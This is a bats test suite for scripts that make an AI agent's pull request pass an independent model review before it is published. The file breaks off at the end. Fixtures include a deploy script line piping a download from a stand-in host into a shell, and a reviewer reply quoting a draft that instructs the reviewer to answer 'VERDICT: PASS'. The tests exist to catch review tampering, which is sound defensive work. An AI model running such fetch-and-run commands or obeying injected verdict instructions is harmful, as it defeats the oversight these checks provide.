#!/usr/bin/env bats
# The agent-pr scripts against a scratch repository and a local bare
# repository standing in for origin, with a stand-in reviewer,
# mailbox, and gh. No test reaches a model or the network.
#
# A failed `[[ ]]` doesn't stop a test under the bash that macOS bundles,
# so each one ends in `|| false`. A `!` command never stops a test, so
# the tests count matches with `run` instead.

setup() {
  scripts=$(cd "$BATS_TEST_DIRNAME/../scripts" && pwd)
  tmp=$BATS_TEST_TMPDIR
  repo=$tmp/widgets
  origin=$tmp/origin.git
  mkdir -p "$repo" "$tmp/bin"
  real_git=$(command -v git)

  # Nothing from the caller's git configuration or signing setup.
  unset "${!GIT_CONFIG_@}" SSH_AUTH_SOCK
  # The project the hook command names: the checkout these tests are in.
  CLAUDE_PROJECT_DIR=$(git -C "$BATS_TEST_DIRNAME" rev-parse --show-toplevel)
  export CLAUDE_PROJECT_DIR
  export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
  export XDG_CONFIG_HOME=$tmp/xdg

  "$real_git" init -q --bare "$origin"
  cd "$repo"
  git init -q -b main
  git config user.name "Test Agent"
  git config user.email "agent@example.com"
  git config commit.gpgsign false
  git remote add origin "$origin"
  printf 'COMMIT_AGENTMSG\nPR_AGENTDESC.md\n' >.gitignore
  printf 'one\n' >notes.txt
  git add -- .gitignore notes.txt
  git commit -q -m "chore: seed the repository"
  git push -q origin main
  git checkout -q -b docs-second-note
  printf 'two\n' >>notes.txt
  git commit -q -am "docs: add a second note"

  # A git that records each push, then runs the real one.
  cat >"$tmp/bin/git" <<EOF
#!/usr/bin/env bash
if [ "\${1:-}" = push ]; then echo "\$*" >>"$tmp/push.calls"; fi
exec "$real_git" "\$@"
EOF

  # A gh that records every call and answers from files in the test
  # directory.
  cat >"$tmp/bin/gh" <<'EOF'
#!/usr/bin/env bash
echo "$*" >>"$STUB_DIR/gh.calls"
[ ! -e "$STUB_DIR/gh-fail" ] || exit 1
case "$1 $2" in
"auth status") exit 0 ;;
"api user") cat "$STUB_DIR/login" ;;
"label list")
  [ ! -x "$STUB_DIR/on-label-list" ] || "$STUB_DIR/on-label-list"
  cat "$STUB_DIR/labels"
  ;;
"api repos/{owner}/{repo}/milestones") cat "$STUB_DIR/milestones" ;;
"api repos/{owner}/{repo}/issues/"*)
  grep -q -x -F -- "${2##*/}" "$STUB_DIR/known-refs" || exit 1
  echo "${2##*/}"
  ;;
"pr list")
  number=$(cat "$STUB_DIR/pr-number" 2>/dev/null || true)
  case " $* " in
  *" --jq "*) [ -z "$number" ] || echo "$number" ;;
  *)
    if [ -n "$number" ]; then
      echo "[{\"number\":$number,\"isDraft\":false,\"url\":\"https://example.com/widgets/pull/$number\"}]"
    else
      echo "[]"
    fi
    ;;
  esac
  ;;
"pr view")
  case " $* " in
  *" --jq .url"*) echo "https://example.com/widgets/pull/$3" ;;
  *) cat "$STUB_DIR/pr-view.json" ;;
  esac
  ;;
"pr create" | "pr edit")
  previous=""
  for arg in "$@"; do
    [ "$previous" != --body-file ] || cp "$arg" "$STUB_DIR/published-body"
    previous=$arg
  done
  if [ "$2" = create ]; then
    echo 7 >"$STUB_DIR/pr-number"
    echo "https://example.com/widgets/pull/7"
  fi
  ;;
"pr ready") ;;
*)
  echo "stub gh: unexpected call: $*" >&2
  exit 1
  ;;
esac
EOF
  chmod +x "$tmp/bin/git" "$tmp/bin/gh"
  export STUB_DIR=$tmp
  export PATH=$tmp/bin:$PATH
  printf 'documentation\nenhancement\nstale\n' >"$tmp/labels"
  printf 'Alpha\n' >"$tmp/milestones"
  printf 'agent-account\n' >"$tmp/login"
  printf '7\n12\n' >"$tmp/known-refs"

  printf -- '---\nname: review\n---\n\nReview the draft in $ARGUMENTS.\n' >"$tmp/criteria.md"
  cat >"$tmp/mail" <<EOF
#!/usr/bin/env bash
echo "\$*" >>"$tmp/mail.calls"
EOF
  chmod +x "$tmp/mail"

  export AGENT_SKILLS_REVIEW_PR_CRITERIA=$tmp/criteria.md
  export AGENT_SKILLS_REVIEW_CMD="cat >'$tmp/prompt'; cat '$tmp/reply'"
  export AGENT_SKILLS_REVIEW_MAX_ROUNDS=2
  export AGENT_SKILLS_LINT_PR_CMD=true
  export AGENT_SKILLS_PR_TITLE_CHECK_CMD=
  export AGENT_SKILLS_GH_LOGIN=agent-account
  export AGENT_SKILLS_MAIL_CMD=$tmp/mail
  export AGENT_SKILLS_MAIL_TO=planner
  export AGENT_SKILLS_MAIL_FROM=claude-test
  export AGENT_SKILLS_OWNER_PATHS='^owned/'
  # The checks these tests exercise, whatever the repository's own settings
  # choose: a required Log entry line and a Related pattern with decision ids.
  export AGENT_SKILLS_PR_LOG_ENTRY=required
  export AGENT_SKILLS_PR_RELATED_PATTERN='^(#[0-9]+|D[0-9]{4})$'

  write_draft None
}

# write_draft <related line>...: a valid description whose Related
# section holds the given lines. The frontmatter is the global
# $frontmatter when set.
write_draft() {
  {
    printf -- '---\n%s\n---\n\n' "${frontmatter:-base: main
draft: false
labels: [documentation]}"
    printf '# docs: add a second note\n\n'
    printf '## Summary\n\nAdds a second note to notes.txt.\n\n'
    printf '## Rationale\n\nThe first note stood alone.\n\n'
    printf '## Verification\n\nRead notes.txt and found both notes.\n\n'
    printf '## Risk\n\nNone beyond a wrong note; revert the commit.\n\n'
    printf '## Related\n\n'
    printf '%s\n' "$@"
    printf '\nLog entry: * **Notes**: added a second note.\n'
  } >"$repo/PR_AGENTDESC.md"
}

reply() {
  printf '%s\n' "$@" >"$tmp/reply"
}

review() {
  run bash "$scripts/review.sh" "$@"
}

publish() {
  run bash "$scripts/publish.sh" "$@"
}

check() {
  run bash "$scripts/check.sh"
}

# A passing review of the current draft.
reviewed() {
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 0 ]
}

state_dir() {
  echo "$(git rev-parse --absolute-git-dir)/agent-skills"
}

# pushed <branch>: succeed when origin holds the branch.
pushed() {
  "$real_git" --git-dir="$origin" rev-parse --verify --quiet "refs/heads/$1" >/dev/null
}

# open_pr <number> <isDraft> [labels json]: the pull request gh finds.
open_pr() {
  local labels='[{"name":"documentation"}]'
  [ $# -lt 3 ] || labels=$3
  printf '%s\n' "$1" >"$tmp/pr-number"
  printf '{"baseRefName":"main","isDraft":%s,"labels":%s,"milestone":null}\n' "$2" "$labels" >"$tmp/pr-view.json"
}

# The guard's hook command, exactly as SKILL.md declares it. A script
# that lost its executable bit fails here as it would in a session.
hook_command() {
  sed -n 's/^ *command: "\(.*\)"$/\1/p' "$BATS_TEST_DIRNAME/../SKILL.md" | head -n 1
}

gh_calls() {
  grep -F -- "$1" "$tmp/gh.calls" || true
}

# The one inputs directory the reviews of this test have left.
inputs_dir() {
  echo "$(state_dir)"/pr.inputs.*
}

# Drop the inputs directories so the next review's is the only one.
forget_inputs() {
  rm -rf "$(state_dir)"/pr.inputs.*
}

@test "a passing review and publish creates the pull request and mails the number and head" {
  reviewed
  publish
  [ "$status" -eq 0 ]
  head=$(git rev-parse HEAD)
  [[ $output == *"published: https://example.com/widgets/pull/7 at $head"* ]] || false
  [ "$(gh_calls 'pr create')" = "pr create --base main --head docs-second-note --title docs: add a second note --body-file $(state_dir)/pr.body.md --label documentation" ]
  pushed docs-second-note
  [ "$("$real_git" --git-dir="$origin" rev-parse refs/heads/docs-second-note)" = "$head" ]
  run grep -c -- "--kind fixed" "$tmp/mail.calls"
  [ "$output" = 1 ]
  run grep -c -- "--pr 7" "$tmp/mail.calls"
  [ "$output" = 1 ]
  run grep -c -F -- "#7 docs: add a second note is open and ready for review: head $head on base main." "$tmp/mail.calls"
  [ "$output" = 1 ]
  [ ! -e "$(state_dir)/pr.stamp" ]
  [ ! -e "$(state_dir)/pr.body.md" ]
}

@test "the reviewer gets the installed criteria with the repository filled in" {
  reviewed
  run grep -c -F "Review the draft in $(git rev-parse --show-toplevel)." "$tmp/prompt"
  [ "$output" = 1 ]
  run grep -c -F "name: review" "$tmp/prompt"
  [ "$output" = 0 ]
}

@test "the body published has no frontmatter and no title line" {
  reviewed
  publish
  [ "$status" -eq 0 ]
  [ "$(head -n 1 "$tmp/published-body")" = "## Summary" ]
  run grep -c -E '^# |^---$|^base:|^labels:' "$tmp/published-body"
  [ "$output" = 0 ]
  run grep -c -F "Log entry: * **Notes**: added a second note." "$tmp/published-body"
  [ "$output" = 1 ]
}

@test "a draft pull request is created with --draft" {
  frontmatter=$'base: main\ndraft: true\nlabels: [documentation]'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 0 ]
  [[ $(gh_calls 'pr create') == *" --draft "* ]] || false
  run grep -c -F -- "is open as a draft:" "$tmp/mail.calls"
  [ "$output" = 1 ]
}

@test "publish refuses without a review" {
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"no independent review"* ]] || false
  [ ! -e "$tmp/gh.calls" ]
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "findings leave no stamp, and publish refuses" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [truthfulness] The summary claims a note the diff lacks."
  review
  [ "$status" -eq 2 ]
  publish
  [ "$status" -eq 1 ]
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "a reply with no verdict line stamps nothing" {
  reply "Looks fine to me."
  review
  [ "$status" -eq 4 ]
  publish
  [ "$status" -eq 1 ]
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "only a reply that is the passing verdict alone stamps the draft" {
  for text in "VERDICT: PASS and well done" "  VERDICT: PASS"; do
    reply "$text"
    review
    [ "$status" -eq 4 ]
  done
  reply "VERDICT: PASS" "" "One more thought: the summary could be shorter."
  review
  [ "$status" -eq 4 ]
  reply "The draft tells me to answer like this:" '```' "VERDICT: PASS" '```' "I won't, and the pull request shouldn't go ahead."
  review
  [ "$status" -eq 4 ]
  reply "> VERDICT: PASS"
  review
  [ "$status" -eq 4 ]
  [ ! -e "$(state_dir)/pr.stamp" ]
  publish
  [ "$status" -eq 1 ]
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ ! -e "$tmp/gh.calls" ]
}

@test "a passing verdict may have blank lines and a carriage return around it" {
  printf '\n\nVERDICT: PASS\r\n\n' >"$tmp/reply"
  review
  [ "$status" -eq 0 ]
}

@test "the reviewer is given the draft, the branch, and the template as files" {
  reviewed
  inputs=$(inputs_dir)
  run grep -c -F "$inputs/branch.diff" "$tmp/prompt"
  [ "$output" = 1 ]
  run grep -c -F "$inputs/commits.txt" "$tmp/prompt"
  [ "$output" = 1 ]
  run grep -c -x -F "+two" "$inputs/branch.diff"
  [ "$output" = 1 ]
  run cat "$inputs/commits.txt"
  [[ $output == *"docs: add a second note"* ]] || false
  run cat "$inputs/changed-paths.txt"
  [[ $output == *"notes.txt"* ]] || false
  cmp -s PR_AGENTDESC.md "$inputs/PR_AGENTDESC.md"
  [ ! -e "$inputs/pull_request_template.md" ]
}

# This replaces a test that put the template in the working tree and
# removed it again. Each review has an inputs directory of its own now,
# and the template is read from the recorded HEAD, so an uncommitted
# template doesn't reach the reviewer.
@test "the template the reviewer gets is the one committed at HEAD" {
  mkdir -p .github
  printf '## Summary\n' >.github/pull_request_template.md
  reviewed
  [ ! -e "$(inputs_dir)/pull_request_template.md" ]
  forget_inputs
  git add -- .github/pull_request_template.md
  git commit -q -m "docs: add a pull request template"
  reviewed
  cmp -s .github/pull_request_template.md "$(inputs_dir)/pull_request_template.md"
  forget_inputs
  git rm -q -- .github/pull_request_template.md
  git commit -q -m "docs: drop the pull request template"
  reviewed
  [ ! -e "$(inputs_dir)/pull_request_template.md" ]
}

@test "each review gathers its inputs in a directory of its own, and a publish clears them" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [substance] The summary restates the diff."
  review
  review
  run bash -c "ls -d '$(state_dir)'/pr.inputs.* | wc -l"
  [ "$((output))" -eq 2 ]
  reviewed
  publish
  [ "$status" -eq 0 ]
  run bash -c "ls -d '$(state_dir)'/pr.inputs.* 2>/dev/null | wc -l"
  [ "$((output))" -eq 0 ]
}

@test "the stamp covers the copy the reviewer was given" {
  reviewed
  stamped=$(sed -n 's/^draft //p' "$(state_dir)/pr.stamp")
  given=$(shasum -a 256 "$(inputs_dir)/PR_AGENTDESC.md" | cut -d' ' -f1)
  [ "$stamped" = "$given" ]
}

@test "a draft rewritten while the inputs are gathered is not stamped" {
  # A git that rewrites the draft when the script asks for the branch's
  # commits, after it has copied the draft for the reviewer.
  cat >"$tmp/bin/git" <<STUB
#!/usr/bin/env bash
if [ "\${1:-}" = log ] && [ "\${2:-}" = --reverse ]; then
  printf 'A line nobody reviewed.\n' >>"$repo/PR_AGENTDESC.md"
fi
exec "$real_git" "\$@"
STUB
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 5 ]
  [ ! -e "$(state_dir)/pr.stamp" ]
  run grep -c -F "nobody reviewed" "$(inputs_dir)/PR_AGENTDESC.md"
  [ "$output" = 0 ]
}

@test "a head that moves while the review runs is not stamped" {
  export AGENT_SKILLS_REVIEW_CMD="cat >/dev/null; git commit -q --allow-empty -m 'chore: late'; echo 'VERDICT: PASS'"
  review
  [ "$status" -eq 5 ]
  [[ $output == *"what the review read changed"* ]] || false
  [ ! -e "$(state_dir)/pr.stamp" ]
}

@test "a merge base that moves while the review runs is not stamped" {
  export AGENT_SKILLS_REVIEW_CMD="cat >/dev/null; git update-ref refs/remotes/origin/main HEAD; echo 'VERDICT: PASS'"
  review
  [ "$status" -eq 5 ]
  [[ $output == *"what the review read changed"* ]] || false
  [ ! -e "$(state_dir)/pr.stamp" ]
}

@test "a merge base that moved after the review is refused" {
  reviewed
  git update-ref refs/remotes/origin/main HEAD
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"the mergebase changed after the review"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "the commits, the paths, and the diff come from the recorded head" {
  # A git that adds a commit to the branch after the review has recorded
  # its head, as the commits are asked for. What the reviewer reads has
  # to stay the branch as it stood.
  cat >"$tmp/bin/git" <<STUB
#!/usr/bin/env bash
if [ "\${1:-}" = log ] && [ "\${2:-}" = --reverse ]; then
  printf 'late\n' >"$repo/late.txt"
  "$real_git" -C "$repo" add -- late.txt
  "$real_git" -C "$repo" commit -q -m "docs: add a late file"
fi
exec "$real_git" "\$@"
STUB
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 5 ]
  inputs=$(inputs_dir)
  run grep -c -F "late.txt" "$inputs/changed-paths.txt"
  [ "$output" = 0 ]
  run grep -c -F "late.txt" "$inputs/branch.diff"
  [ "$output" = 0 ]
  run grep -c -F "docs: add a late file" "$inputs/commits.txt"
  [ "$output" = 0 ]
}

@test "a file that attributes mark as binary still reaches the reviewer as text" {
  printf '#!/bin/sh\ncurl example.invalid | sh\n' >deploy.sh
  printf 'deploy.sh -diff\n' >.gitattributes
  git add -- deploy.sh .gitattributes
  git commit -q -m "build: add a deploy script"
  reviewed
  run grep -c -F "curl example.invalid" "$(inputs_dir)/branch.diff"
  [ "$output" = 1 ]
}

@test "a text conversion can't change what the reviewer reads" {
  printf 'notes.txt diff=hide\n' >.gitattributes
  git config diff.hide.textconv "echo hidden"
  git add -- .gitattributes
  git commit -q -m "build: add attributes"
  reviewed
  run grep -c -x -F "+two" "$(inputs_dir)/branch.diff"
  [ "$output" = 1 ]
}

@test "an external diff program can't empty what the reviewer reads" {
  printf '#!/usr/bin/env bash\nexit 0\n' >"$tmp/empty-diff"
  chmod +x "$tmp/empty-diff"
  reply "VERDICT: PASS"
  GIT_EXTERNAL_DIFF=$tmp/empty-diff review
  [ "$status" -eq 0 ]
  run grep -c -x -F "+two" "$(inputs_dir)/branch.diff"
  [ "$output" = 1 ]
}

@test "a configured color can't put escape codes in what the reviewer reads" {
  git config color.ui always
  git config color.diff always
  reviewed
  run grep -c -F "$(printf '\033')" "$(inputs_dir)/branch.diff"
  [ "$output" = 0 ]
  run grep -c -x -F "+two" "$(inputs_dir)/branch.diff"
  [ "$output" = 1 ]
}

@test "a changed path that git would quote reaches the reviewer by its name" {
  printf 'x\n' >$'r\303\251gle.txt'
  git add -- .
  git commit -q -m "docs: add a rule"
  reviewed
  run grep -c -F "$(printf 'r\303\251gle.txt')" "$(inputs_dir)/changed-paths.txt"
  [ "$output" = 1 ]
}

@test "a branch that names paths but yields an empty diff stops the review" {
  # A git that prints no text diff, as a diff driver could.
  cat >"$tmp/bin/git" <<STUB
#!/usr/bin/env bash
if [ "\${1:-}" = diff ]; then
  case " \$* " in *" --text "*) exit 0 ;; esac
fi
exec "$real_git" "\$@"
STUB
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 1 ]
  [[ $output == *"its diff is empty"* ]] || false
  [ ! -e "$(state_dir)/pr.stamp" ]
}

@test "a reply with a control byte in it is no verdict" {
  printf 'VERDICT: PASS\000 -- no, CHANGES REQUIRED\n' >"$tmp/reply"
  review
  [ "$status" -eq 4 ]
  # The system's own awk, which on macOS reads a NUL as the end of a line.
  if [ -x /usr/bin/awk ]; then
    mkdir -p "$tmp/system-awk"
    ln -s /usr/bin/awk "$tmp/system-awk/awk"
    PATH=$tmp/system-awk:$PATH review
    [ "$status" -eq 4 ]
  fi
  printf 'VERDICT: PASS\033[2K\n' >"$tmp/reply"
  review
  [ "$status" -eq 4 ]
  [ ! -e "$(state_dir)/pr.stamp" ]
}

@test "the default reviewer has tools that read and search, and no shell" {
  mkdir -p "$tmp/claude-bin"
  cat >"$tmp/claude-bin/claude" <<STUB
#!/usr/bin/env bash
cat >/dev/null
printf '%s\n' "\$@" >"$tmp/claude.args"
echo "VERDICT: PASS"
STUB
  chmod +x "$tmp/claude-bin/claude"
  export PATH=$tmp/claude-bin:$PATH
  export AGENT_SKILLS_REVIEW_CMD=
  export AGENT_SKILLS_REVIEW_MODEL=test-model
  export AGENT_SKILLS_REVIEW_EFFORT=low
  review
  [ "$status" -eq 0 ]
  run grep -c -i -E "bash|write|edit" "$tmp/claude.args"
  [ "$output" = 0 ]
  run tr '\n' ' ' <"$tmp/claude.args"
  [[ $output == *"--tools Read Grep Glob --allowedTools Read Grep Glob"* ]] || false
}

@test "a draft edited after its review is refused" {
  reviewed
  write_draft D0056
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"changed after its review"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "a draft that changes while the review runs is not stamped" {
  export AGENT_SKILLS_REVIEW_CMD="cat >/dev/null; printf 'edited\n' >>PR_AGENTDESC.md; echo 'VERDICT: PASS'"
  review
  [ "$status" -eq 5 ]
  publish
  [ "$status" -eq 1 ]
}

@test "a new commit after the review is refused" {
  reviewed
  printf 'three\n' >>notes.txt
  git commit -q -am "docs: add a third note"
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"the head changed after the review"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "publish refuses on the base branch and on a detached head" {
  reviewed
  git checkout -q main
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"is the base branch"* ]] || false
  git checkout -q --detach
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"detached"* ]] || false
}

@test "publish refuses without a draft" {
  rm PR_AGENTDESC.md
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"PR_AGENTDESC.md is missing"* ]] || false
}

@test "a merge in progress is refused by the review and by the publish" {
  git checkout -q main
  git checkout -q -b other
  printf 'other\n' >other.txt
  git add -- other.txt
  git commit -q -m "docs: add another file"
  git checkout -q docs-second-note
  git merge -q --no-commit --no-ff other
  start=$(git rev-parse HEAD)
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 1 ]
  [[ $output == *"MERGE_HEAD is in progress"* ]] || false
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"MERGE_HEAD is in progress"* ]] || false
  [ "$(git rev-parse HEAD)" = "$start" ]
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "a stamp made before a cherry-pick began doesn't publish the pick" {
  reviewed
  : >"$(git rev-parse --absolute-git-dir)/CHERRY_PICK_HEAD"
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"CHERRY_PICK_HEAD is in progress"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ ! -e "$tmp/gh.calls" ]
}

@test "a revert or a rebase in progress is refused" {
  for marker in REVERT_HEAD rebase-merge rebase-apply; do
    if [ "$marker" = REVERT_HEAD ]; then
      : >"$(git rev-parse --absolute-git-dir)/$marker"
    else
      mkdir "$(git rev-parse --absolute-git-dir)/$marker"
    fi
    reply "VERDICT: PASS"
    review
    [ "$status" -eq 1 ]
    [[ $output == *"$marker is in progress"* ]] || false
    publish
    [ "$status" -eq 1 ]
    [[ $output == *"$marker is in progress"* ]] || false
    rm -rf "$(git rev-parse --absolute-git-dir)/$marker"
  done
}

@test "a detached HEAD is refused by the review" {
  git checkout -q --detach
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 1 ]
  [[ $output == *"HEAD is detached"* ]] || false
  [ ! -e "$(state_dir)/pr.stamp" ]
}

@test "a branch with no commit yet is refused with a plain message" {
  mkdir "$tmp/fresh"
  cd "$tmp/fresh"
  git init -q -b main
  printf -- '---\nbase: main\ndraft: false\nlabels: [documentation]\n---\n\n# docs: begin\n' >PR_AGENTDESC.md
  review
  [ "$status" -eq 1 ]
  [[ $output == *"no commit yet"* ]] || false
}

@test "an empty lint command stops the check and the publish" {
  reviewed
  export AGENT_SKILLS_LINT_PR_CMD=
  check
  [ "$status" -eq 1 ]
  [[ $output == *"lint_pr_cmd is empty"* ]] || false
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"lint_pr_cmd is empty"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ ! -e "$tmp/gh.calls" ]
}

@test "the scripts take no argument but the review's --unblock and publish's --rewrite" {
  run bash "$scripts/publish.sh" --rewrite extra
  [ "$status" -eq 1 ]
  [[ $output == *"usage: publish.sh [--rewrite]"* ]] || false
  for script in check publish; do
    run bash "$scripts/$script.sh" extra
    [ "$status" -eq 1 ]
    [[ $output == *"usage: $script.sh"* ]] || false
  done
  for arguments in "--amend" "extra" "--unblock extra" "--unblock --unblock"; do
    # The words of each case split into separate arguments here.
    run bash "$scripts/review.sh" $arguments
    [ "$status" -eq 1 ]
    [[ $output == *"usage: review.sh [--unblock]"* ]] || false
  done
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "a blocked review stays blocked until it is cleared" {
  reply "VERDICT: CHANGES REQUIRED" "" "1. [substance] The summary restates the diff."
  review
  review
  review
  [ "$status" -eq 3 ]
  reply "VERDICT: PASS"
  review
  [ "$status" -eq 3 ]
  [[ $output == *"Wait for word"* ]] || false
  [ ! -e "$(state_dir)/pr.stamp" ]
  run grep -c -- "--kind blocker" "$tmp/mail.calls"
  [ "$output" = 1 ]
  review --unblock
  [ "$status" -eq 0 ]
  review
  [ "$status" -eq 0 ]
}

# --- the mechanical checks --------------------------------------------

@test "check passes on a valid description" {
  check
  [ "$status" -eq 0 ]
  [ "$output" = "description checks pass" ]
}

@test "a missing Log entry line fails the check and publish" {
  sed '$d' PR_AGENTDESC.md >PR_AGENTDESC.md.new && mv PR_AGENTDESC.md.new PR_AGENTDESC.md
  check
  [ "$status" -eq 1 ]
  [[ $output == *"the description must end with a line of the form: Log entry: * **Label**: text"* ]] || false
  reviewed
  publish
  [ "$status" -eq 1 ]
  run pushed docs-second-note
  [ "$status" -ne 0 ]
}

@test "a Log entry line that is not last fails" {
  printf '\nA closing remark.\n' >>PR_AGENTDESC.md
  check
  [ "$status" -eq 1 ]
  [[ $output == *"Log entry: * **Label**: text"* ]] || false
}

@test "a malformed Log entry line fails" {
  sed '$d' PR_AGENTDESC.md >PR_AGENTDESC.md.new && mv PR_AGENTDESC.md.new PR_AGENTDESC.md
  printf 'Log entry: added a second note.\n' >>PR_AGENTDESC.md
  check
  [ "$status" -eq 1 ]
}

@test "pr_log_entry set to off skips the Log entry check" {
  sed '$d' PR_AGENTDESC.md >PR_AGENTDESC.md.new && mv PR_AGENTDESC.md.new PR_AGENTDESC.md
  export AGENT_SKILLS_PR_LOG_ENTRY=off
  check
  [ "$status" -eq 0 ]
}

@test "a Related section with a prose line fails" {
  write_draft "Builds on the earlier pull request."
  check
  [ "$status" -eq 1 ]
  [[ $output == *"Related lists issue numbers and decision ids only, or None"* ]] || false
  [[ $output == *"Builds on the earlier pull request."* ]] || false
}

@test "Related accepts issue numbers, decision ids, bulleted lists, and None" {
  for related in "#12" "D0056" "* #12, D0056" "- D0056" "None" "None." "* None"; do
    write_draft "$related"
    check
    [ "$status" -eq 0 ]
  done
  write_draft "#12" "D0056"
  check
  [ "$status" -eq 0 ]
}

@test "None beside another item fails" {
  write_draft "None" "#12"
  check
  [ "$status" -eq 1 ]
  [[ $output == *"Related lists issue numbers and decision ids only, or None"* ]] || false
  write_draft "#12, None"
  check
  [ "$status" -eq 1 ]
}

@test "an empty pr_related_pattern skips the Related check" {
  write_draft "Builds on the earlier pull request."
  export AGENT_SKILLS_PR_RELATED_PATTERN=
  check
  [ "$status" -eq 0 ]
}

@test "a failing lint command fails the check and prints its output" {
  export AGENT_SKILLS_LINT_PR_CMD="echo 'vale found a tell'; exit 1"
  check
  [ "$status" -eq 1 ]
  [[ $output == *"vale found a tell"* ]] || false
}

@test "a failing title check fails and receives the base, head, and title" {
  export AGENT_SKILLS_PR_TITLE_CHECK_CMD='echo "title check: $AS_BASE|$AS_HEAD|$AS_TITLE"; exit 1'
  check
  [ "$status" -eq 1 ]
  [[ $output == *"title check: origin/main|HEAD|docs: add a second note"* ]] || false
  export AGENT_SKILLS_PR_TITLE_CHECK_CMD='exit 0'
  check
  [ "$status" -eq 0 ]
}

@test "the check reports every failure in one run" {
  export AGENT_SKILLS_LINT_PR_CMD="echo 'vale found a tell'; exit 1"
  write_draft "Builds on the earlier pull request."
  sed '$d' PR_AGENTDESC.md >PR_AGENTDESC.md.new && mv PR_AGENTDESC.md.new PR_AGENTDESC.md
  check
  [ "$status" -eq 1 ]
  [[ $output == *"vale found a tell"* ]] || false
  [[ $output == *"Related lists issue numbers"* ]] || false
  [[ $output == *"Log entry: * **Label**: text"* ]] || false
}

@test "a draft that the lint command rewrites is not published" {
  reviewed
  export AGENT_SKILLS_LINT_PR_CMD="sed 's/Adds a second note/Adds a note nobody reviewed/' PR_AGENTDESC.md >PR_AGENTDESC.md.new && mv PR_AGENTDESC.md.new PR_AGENTDESC.md"
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"changed after its review"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ -z "$(gh_calls 'pr create')" ]
  [ -z "$(gh_calls 'pr edit')" ]
}

@test "a draft or a head that changes while gh checks the labels is not published" {
  reviewed
  cat >"$tmp/on-label-list" <<STUB
#!/usr/bin/env bash
sed 's/Adds a second note/Adds a note nobody reviewed/' "$repo/PR_AGENTDESC.md" >"$repo/PR_AGENTDESC.md.new" && mv "$repo/PR_AGENTDESC.md.new" "$repo/PR_AGENTDESC.md"
STUB
  chmod +x "$tmp/on-label-list"
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"changed after its review"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ -z "$(gh_calls 'pr create')" ]
  cat >"$tmp/on-label-list" <<STUB
#!/usr/bin/env bash
git -C "$repo" commit -q --allow-empty -m "chore: sneak in a commit"
STUB
  write_draft None
  reviewed
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"the head changed after the review"* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ -z "$(gh_calls 'pr create')" ]
}

@test "a pre-push hook that rewrites the draft doesn't change what is published" {
  reviewed
  printf '#!/usr/bin/env bash\nsed -e "s/Adds a second note/Rewritten after the check/" -e "s/^# docs: add a second note/# docs: a title nobody reviewed/" PR_AGENTDESC.md >PR_AGENTDESC.md.new && mv PR_AGENTDESC.md.new PR_AGENTDESC.md\n' >.git/hooks/pre-push
  chmod +x .git/hooks/pre-push
  publish
  [ "$status" -eq 0 ]
  run grep -c "Rewritten after the check" PR_AGENTDESC.md
  [ "$output" = 1 ]
  run grep -c "Rewritten after the check" "$tmp/published-body"
  [ "$output" = 0 ]
  run grep -c -F "Adds a second note to notes.txt." "$tmp/published-body"
  [ "$output" = 1 ]
  [[ $(gh_calls 'pr create') == *"--title docs: add a second note --body-file"* ]] || false
}

@test "a pre-push hook that makes a commit leaves the pull request untouched" {
  reviewed
  printf '#!/usr/bin/env bash\ngit commit -q --allow-empty -m "chore: hooked"\n' >.git/hooks/pre-push
  chmod +x .git/hooks/pre-push
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"HEAD moved during the push"* ]] || false
  [ -z "$(gh_calls 'pr create')" ]
  [ -z "$(gh_calls 'pr edit')" ]
}

@test "an origin that doesn't hold the reviewed commit after the push leaves the pull request untouched" {
  reviewed
  printf '#!/usr/bin/env bash\ngit update-ref refs/heads/docs-second-note "$(git rev-parse refs/heads/main)"\n' >"$origin/hooks/post-receive"
  chmod +x "$origin/hooks/post-receive"
  publish
  [ "$status" -eq 1 ]
  [[ $output == *"after the push, not the reviewed"* ]] || false
  [ -z "$(gh_calls 'pr create')" ]
  [ -z "$(gh_calls 'pr edit')" ]
}

@test "an unknown label refuses before anything is pushed" {
  frontmatter=$'base: main\ndraft: false\nlabels: [documentation, mystery]'
  write_draft None
  reviewed
  publish
  [ "$status" -eq 1 ]
  [[ $output == *'no label named "mystery"'* ]] || false
  run pushed docs-second-note
  [ "$status" -ne 0 ]
  [ -z "$(gh_calls 'pr create')" ]
}

@test "a cited issue that doesn't exist refuses before anything is pushed" {
  write_draft "* #12" "* #999999"
  reviewed
  publish
  [ "$status" -eq 1 ]
